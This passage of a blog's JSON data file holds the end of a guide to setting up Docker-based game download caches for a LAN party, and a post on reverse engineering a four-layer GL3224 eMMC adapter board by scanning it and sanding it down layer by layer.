`/etc/fstab` so that it will auto-mount. I have mine mounting to `/cache` in the root of the system.\n\n### Step 5 - Setup Network for Containers\n\nWe want to give each container a unique IP address on the network, so we need to create a unique IP address for each container so that can happen.\n\nSince Ubuntu 18.04 uses netplan instead of `/etc/network/interfaces` , let's try that out. \n\nCreate a `lanparty.yaml` file with your IPs.\n\n    network:\n        ethernets:\n            ens160:\n                addresses:\n                    [10.0.0.2/24, 10.42.0.3/24, 10.42.0.4/24, 10.42.0.5/24]\n                gateway4: 10.0.0.1\n                nameservers:\n                        addresses:\n                                - 10.0.0.1\n        version: 2\n    \n\nThen you'll need to restart netplan for the new IPs: `sudo netplan apply`\n\n### Step 6 - Install the Various Containers\n\nWe're going to create a container for each service we want to cache. SaltLAN shows this is what it would look like if we were to create the commands manually:\nServiceCommandSteam`sudo docker run --name steam-cache -p 10.0.0.2:80:80 -d steamcache/steamcache`Battle.net`sudo docker run --name blizzard-cache -p 10.0.0.3:80:80 -d steamcache/generic`Origin`sudo docker run --name origin-cache -p 10.0.0.4:80:80 -d steamcache/generic`Uplay`sudo docker run --name uplay-cache -p 10.0.0.5:80:80 -d steamcache/generic`Riot`sudo docker run --name riot-cache -p 10.0.0.6:80:80 -d steamcache/generic`Frontier`sudo docker run --name frontier-cache -p 10.0.0.7:80:80 -d steamcache/generic`Windows`sudo docker run --name windows-cache -p 10.0.0.8:80:80 -d steamcache/generic`Twitch`sudo docker run --name twitch-cache -p 10.0.0.9:80:80 -d steamcache/twitch`\nAgain, since we're going to put our own twist on it, these will be different. Specifically we're going to add a mountpath inside the container to point to our NVMe drive AND we're going to do it all using Portainer's GUI.\n\nContainers -> + Add Container\n\nThen fill in the Settings. I'll show screenshots for a Steam Cache:\n\n![](2018/11/Screenshot_2018-11-19-18.52.56_wehvoV.jpg \"Main Steam Container Settings\")\n\n![](2018/11/image-8.jpg \"Steam Volume Mount Paths\")\n\n![](2018/11/image-10.jpg \"Steam Restart Policy\")\n\nOnce all those are done, you can go ahead and deploy the container.\n\nCreate containers for each of the different services.\n\nYou'll want to read the [steamcache/generic](https://github.com/steamcache/generic) guide. If you're using SNIProxy or SteamDNS (you should use both), you'll set the port mapping just to something like `443:443`, without any IPs. That'll make it so that it is mapped to *all* IPs.\n\nAlso, There are environmental variables you need to set to configure things for your environment.\n\nThe only one I'll show is the SteamDNS env variables:\n\n![](2018/11/image-13.jpg \"SteamDNS ENV Variables\")\n\nBeyond that, you can handle it. Here's what mine looked like completed:\n\n![](2018/11/image-12.jpg \"All Caching Containers\")\n\n### Step 7 - Set your router DNS\n\nThis step is the last step before things start taking effect. You need to go to your router and change your DNS server to a local one. This was *not* as common a feature as I hoped it would be. This may require you to get a nice router and setup OpenWRT or something similar onto it to get that running. Good luck on this one.\n\n### Step 8 - Analytics & Maintenance\n\nThere are a lot of tools that you can setup for this. I didn't really care about it.\nAll I did was tweak the script [from SaltLAN](https://github.com/SaltLAN/Configuration/blob/master/scripts/saltlan) and make it fit my environment. You can find that [here](https://gist.github.com/miketweaver/9f8e60db3ee5cbe7dd0cde6b88184956). \n\n## Enjoy!\n\nI hope you have enjoyed this guide. I had a lot of fun at my LAN Party and a lot of games were had!\n\nThe cache worked very well for use. We saved over 1TB of data transferred, which would have killed our Comcast Data Cap. We did run into issues where we were limited by the 1GBs cap and the Samba Share would only *really* push to one person at a time, so I'll look at ways of improving this.\n\nIn the future I hope to look at stuff such as [Linux ZFS ARC](https://pthree.org/2012/12/07/zfs-administration-part-iv-the-adjustable-replacement-cache/) and setting up 10G networking.\n\nwith ❤️️ \n-- [bashNinja](https://twitter.com/_bashNinja)\n"},{"title":"Reverse engineering a 4 layer PCB, the slow and destructive way","slug":"reverse-engineering-4-layer-pcb","date_published":1542408103000,"date_updated":1542408103000,"tags":["EE","RE"],"excerpt":"Excitement! There was a sketchy padded envelope in the mail today. Where do we go next?","cover":"2018/11/IMG_20180416_194909.jpg","author":{"name":"David Freitag","avatar":"avatars/david-freitag.jpg"},"content":"\nSo say there's a Chinese silicon vendor which designs and sells a chip that does a lot of really fancy stuff. You're super interested because said fancy bits can be had for the low low price of a few hundred pennies. Awesome, you might say, lets buy them! But there's an issue. Documentation. Silicon vendors, Chinese or otherwise, have a nasty habit of making it nearly impossible to find proper documentation for a specific product; whether it's poorly documented, NDA'd, or in some cases simply nonexistent.\n\n![](2018/11/take_my_money.png)\n\nSo what can you do? You could find someone who sells a product based on the chip you want to use, but if it's extensible and has a lot of features you may not be able to find something you can easily shoehorn into your design. You could try contacting them to see if the offer of buying a zillion of their chips can coax them into releasing precious bits of documentation, but there are generally engineering fees associated with this. You could offer to sign an NDA, but generally they don't let someone off the street sign one, and that precludes you from open sourcing your awesome new project.\n\nOnce you've tried knocking on those doors, there's basically not much else you can do to get proper documentation. In your hypothetical situation, let's assume there is one or more existing products which are, of course, not open source based on this fancy hotness you're so interested in. For argument's sake, lets assume that this chip is not something trivially placed on a simple 2 layer board. It's QFN, BGA, quite possibly with some RF goodness. Since, aside passive component values, reverse engineering a 2 layer board can pretty easily be done with just high quality images.\n\nMeet the Genesys Logic [GL3224](http://www.genesyslogic.com/en/product_view.php?show=53). Less than [200 pennies](https://lcsc.com/product-detail/USB_GENESYS_GL3224-OIY04_GL3224-OIY04_C157357.html) in single quantity! It's a fancy USB 3.0 eMMC/SD MMC controller with a bunch of really cool features. Genesys Logic themselves offer up a sick single-page (as per usual) short touting all of its features. A bit of Google fu reveals a 25 page datasheet and a few existing products based on this chip. One product [in particular](https://jiffyshop.com.au/SBC/odroid-c1/160-usb30-emmc-module-writer.html) caught my eye. Searches on Amazon etc for GL3224 turned up a lot of products, mostly polished ones with nice injection mold plastic cases that were a bit too pricey. At the time of this writing, the [Hardkernel store](https://www.hardkernel.com/main/products/prdt_info.php?g_code=G152105300286) that I bought these for $10 404's, but you can still get these boards fairly cheaply.\n\n![](2018/11/odroid_emmc-1.jpg)\n\nSo you buy a couple of these, they're on the slow boat from China. What's the first step? Is there anything we can do while we wait? Of course! The top and bottom layers are exposed (albeit on black soldermask which is pretty but a pain to RE), and you can begin like so many 2 layer RE's have in the past. By staring and squinting at a series of potato quality pictures of the board, highlighting traces, colorizing layers, overlaying things, and trying to get a rough idea of what's going on. From the datasheet we have the pinout and other general information about the chip that will help us, and we have the pinout of the eMMC connector because it's one of the ODROID standardized ones.\n\n![](2018/11/odroid_emmc.jpg)\n\nExcitement! There was a sketchy padded envelope in the mail today. Where do we go next? You're going to need some hot air reworking tools and a relatively high DPI scanner. [The one that I bought](https://www.amazon.com/gp/product/B00SQ6CCSS) is capable of doing 9600 DPI (which is absolutely insane), but you can probably get away with anything above ~600 DPI. Start by removing all of the tall components, large capacitors, connectors, etc. The taller the components, the more out of focus the images you take will be, most scanners have a fixed focal point.\n\n![](2018/11/emmc_crystal.jpg \"4800 DPI scans are crazy\")\n\n![](2018/11/img010_small.jpg)\n\nOnce you have some quality scans of the board, start carefully removing components one by one. If there are reference designators on the board, use them to identify each component as you remove it, measure it, and record the value. Keeping a meticulous record will help when you go to design your version. Once you've pulled all the parts off and cataloged them, use a soldering iron, some leaded solder, and a bunch of flux to clean all of the excess solder. Take as many scans as you want, once you start sanding there's no turning back.\n\n    C1        1.19uF         R1        32.7Ω\n    C2        114nF          R2        9.82kΩ\n    C3        106nF          R3        0.2Ω\n    C4        106nF          R6        1.001MΩ\n    C5        114nF          R7        683Ω\n    C6        106nF          R8        10.06kΩ\n    C7        1.16uF         R9        0.6Ω\n    C10       1.18uF         R10       463.5Ω\n    C14       2.27uF\n    C15       2.24uF\n    C16       ?pF\n    C17       ?PF\n    C18       115nF\n    C19       108nF\n    C20       108nF\n    \n\n\n![](2018/11/img011_small.jpg)\n\nFor the sanding, I used a combination of 200 and 600 grit wet dry sand paper. You can get this at any local hardware store. Taking off the soldermask will be extremely quick, especially on this board where you can literally see through the soldermask. Wet a small piece of the 600 grid sand paper and start sanding\n\n![](2018/11/img013_small.jpg \"Top Copper Layer\")\n\nYou can see that the contrast on the bare copper compared to the PCB core material is much higher compared to when everything is covered with soldermask. Next, we switch to the 200 grit to sand through the much thicker layer of copper and core material so that we can expose the inner layer.\n\n![](2018/11/img015_small.jpg \"Core material\")\n\nBe sure to apply even pressure while sanding, if you don't you can end up with edges of the board that sand clear through the inner copper layer like I did. It's going to take a while, and make a gigantic mess. My desk is still a sickly shade of green because of this project.\n\n![](2018/11/img016_small.jpg \"Inner Copper Layer 2\")\n\nAgain, I need to stress that even pressure is extremely important, you can see I even started to wear away parts of that power rail. Once you get to this point, with a 4 layer board, you're done. Switch to the other side, rinse, and repeat. Once you have exposed layer 3 (which in this case was frustratingly only solid ground pour), take all of your scans and composite them. Set each layer to a pure color by dumping the saturation and tweaking with the layer opacity until you get something you can understand. In this case, I chose red for the top layer, green for layer 2, and blue for the bottom layer. The result is pretty good, but if you really put some work into it you can get really great images.\n\n![](2018/11/img013_composite_small.jpg \"Composited image with 3 copper layers\")\n\nNow that the RE work is done, it's time to do your schematic and layout work. The WIP repository can be found [here](https://github.com/dvdfreitag/USB3-eMMC), and the Eagle library for my GL3224 part can be found [here](https://github.com/dvdfreitag/eagle_libraries). Keen observers will notice that the connector and pinout for the eMMC that I chose is identical to the one that the Nintendo Switch uses. This board is meant to be a high speed NAND backup and restore utility for the Switch.\n\n![](2018/11/emmc_re.jpg)\n\n"}],"pagination":{"totalPages":2,"totalItems":14,"currentPage":1}},"__N_SSG":true}